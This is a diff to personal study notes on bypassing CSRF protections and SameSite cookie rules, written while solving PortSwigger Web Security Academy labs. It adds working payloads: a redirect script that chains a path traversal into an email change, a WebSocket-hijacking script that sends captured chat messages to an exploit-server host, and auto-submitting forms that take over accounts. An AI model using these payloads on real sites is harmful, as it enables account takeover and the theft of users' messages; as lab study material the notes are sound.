@@ -4,6 +4,7 @@
 - check content type
 - check referer header
 - chnage POST to GET or GET to post
+- same site cookies bypasses 
 
 ### CSRF token bybass methods
 - reomving ANI-csrf token
@@ -204,7 +205,8 @@ When setting a cookie with `SameSite=None`, the website must also include the 
 
 ## bypassing 
 
-###  if he don't use CSRF token but uses lax or default same site cookie settings 
+###  if he don't use CSRF token but uses `lax` or default same site cookie settings 
+if he uses `lax` `chrome` initiates `lax` after `120 sec` 
 if he accepts the submission over a `get` request then we can overwrite the method at CSRF POC 
 as we know when using `lax` we can only make the victim send cookie cross sited only if he uses get request so we can over write it like that 
 ```html
@@ -223,3 +225,67 @@ as we know when using `lax` we can only make the victim send cookie cross sited 
 ```
 we trick the browser by make the method of the form `get` but we overwrite it in the next step 
 
+### if the web site made the cookie `srtict`
+so we have nothing to do but finding  a redirect in the website and the endpoint of the CSRF vulnerable function accepts `GET` request so we need to manipulate the URL for redirect to our endpoint and with all parameters and redirections 
+```js
+<script>
+window.location="https://0aa200ba03bde9e280e2088d006f00be.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail%3dyoussefsemira1%2540gmail.com%26submit%3d1";
+</script>
+```
+so we made a script that redirects us to the vulnerable endpoint with the new credentials 
+
+### if the web site made the cookie `srtict` again 
+but u can't find any redirection in you r domain so if you found the `CORS`header `acces-control=allow=inrigin=origin.com` so if you found any vulnerability in that domain that means that you can exploit the `CSRF` 
+
+
+this code is for hijacking the websocket by another domain 
+```js 
+<script>
+var webSocket = new WebSocket(
+    "wss://0a7a007e033d38b38015171c000700c4.web-security-academy.net/chat"
+);
+
+webSocket.onopen = function (evt) {
+    webSocket.send("READY");
+};
+
+webSocket.onmessage = function (evt) {
+    var message = evt.data;
+    fetch(
+        "https://exploit-0ad2007d03e4382c8000167001200042.exploit-server.net/exploit?message=" + 
+        btoa(message)
+    );
+}
+</script>
+
+```
+### if he using default same site cookie settings  
+and you want to `bypasses` the restriction of advantages the settings for `lax for chrome users`
+if the user have been logged in within 120 sec the attack will work without any restriction but if the time exceeded the 120 sec it gonnna be impossible  so we need to fiend a way to refresh the cookies 
+
+at our lab we have 0Auth authentication method  every time we visit specific page the whole authentication process regenerates  so we need the user just visit this page first and then we apply on him the CSRF payload 
+
+
+so I made this  payload 
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form>
+<script>
+window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); 
+function changeEmail()
+{ document.forms[0].submit(); }
+</script>
+```
+but the redirection keeps blocking cuz there is no interaction happen to prompt 
+so i made another one 
+
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> 
+<p>Click anywhere on the page</p> 
+<script>
+window.onclick = () => 
+{ window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } 
+function changeEmail() {
+document.forms[0].submit(); 
+} </script>
+```
+we make the user click any where at the page and the prompt happened and it worked 
